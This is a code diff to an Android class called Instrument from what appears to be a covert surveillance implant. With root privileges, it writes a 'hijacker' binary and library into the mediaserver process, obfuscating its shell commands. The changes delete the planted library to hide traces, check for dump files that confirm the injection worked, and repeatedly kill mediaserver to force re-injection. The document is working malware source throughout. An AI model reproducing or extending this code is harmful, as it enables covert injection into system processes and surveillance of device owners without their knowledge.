@@ -15,11 +15,14 @@ import com.android.m.M;
 
 public class Instrument {
 	private static final String TAG = "Instrument";
+	private static final int MAX_KILLED = 3;
 	private String proc;
+	private MediaserverMonitor pidMonitor;
 	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
 	private boolean stopMonitor = false;
-	private MediaserverMonitor pidMonitor;
+
 	private Thread monitor;
+	private int killed = 0;
 
 	public Instrument(String process, String dump) {
 		final File filesPath = Status.getAppContext().getFilesDir();
@@ -48,7 +51,7 @@ public class Instrument {
 			
 			// Install library
 			Root.fileWrite(lib, stream, Cfg.RNDDB);
-			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + path + "/" + lib);
+			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + path + "/" + lib);
 
 			// copy_remount libt.so to /system/lib/
 			// Execute.execute(Configuration.shellFile + " " + "fhs" + " " +
@@ -61,7 +64,7 @@ public class Instrument {
 
 			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
 			Runtime.getRuntime()
-					.exec(Configuration.shellFile + " " + M.e("pzm 750") + " " + path + "/" + hijacker);
+					.exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);
 
 			stream.close();
 		} catch (Exception e) {
@@ -72,8 +75,11 @@ public class Instrument {
 			return false;
 		}
 
-		// File file = new File(Status.getAppContext().getFilesDir(), lib);
-		// file.delete();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installHijacker) delete lib");
+		}
+		File file = new File(Status.getAppContext().getFilesDir(), lib);
+		file.delete();
 
 		return true;
 	}
@@ -100,6 +106,35 @@ public class Instrument {
 			
 			Root.removeScript(scriptName);
 
+			Utils.sleep(2);
+			int newpid = getProcessPid();
+			if (newpid != pid) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
+				}
+			}
+			
+			File d = new File(dumpPath);
+			File[] files = d.listFiles();
+			boolean started = false;
+			for (File file : files) {
+				if(file.getName().endsWith(M.e(".cnf"))){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+					}
+					started = true;
+					file.delete();
+				}
+			}
+ 
+			if(!started && killed < MAX_KILLED){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (startInstrumentation) Kill mediaserver");
+				}
+				killProc();
+				killed +=1;
+			}
+				
 			stopMonitor = false;
 
 			if (pidMonitor == null) {
@@ -153,6 +188,16 @@ public class Instrument {
 
 		return pid;
 	}
+	
+	public void killProc() {
+		try {
+			int pid = getProcessPid();
+			android.os.Process.killProcess(pid);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (killProc) Error: " + ex);
+			}
+		}
 
 	class MediaserverMonitor implements Runnable {
 		private int cur_pid, start_pid;
